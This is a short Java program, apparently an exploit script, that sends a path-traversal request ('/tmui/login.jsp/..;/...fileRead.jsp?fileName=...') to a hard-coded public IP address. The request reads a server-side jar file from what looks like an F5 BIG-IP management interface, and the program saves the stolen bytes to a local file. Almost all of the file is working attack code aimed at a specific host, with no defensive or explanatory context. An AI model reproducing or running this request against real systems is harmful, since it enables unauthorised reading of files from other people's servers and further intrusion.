package test;

import java.io.File;
import java.io.FileOutputStream;

import httpbase.DoRequest;
import httpbase.Response;

public class download {
	public static void main(String args[]) throws Exception {
		
		String url = "https://104.215.77.82/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/usr/local/www/tmui/WEB-INF/lib/tmui.jar";
		
		String httpservice3 = "https://104.215.77.82/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/usr/local/www/tmui/WEB-INF/lib/tmui.jar";
		String raws3 ="GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/usr/local/www/tmui/WEB-INF/lib/tmui.jar HTTP/1.1\r\n" + 
				"Host: 104.215.77.82\r\n" + 
				"User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0\r\n" + 
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" + 
				"Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n" + 
				"Accept-Encoding: gzip, deflate\r\n" + 
				"Connection: close\r\n" + 
				"Upgrade-Insecure-Requests: 1\r\n" + 
				"\r\n" + 
				"";
		String proxy = "http://127.0.0.1:8080";
		Response response = new DoRequest().makeRequest(httpservice3,raws3.getBytes(),null);
		FileOutputStream output = new FileOutputStream(new File("d:/xxxx.class"));
		output.write(response.getBody());
	}
}
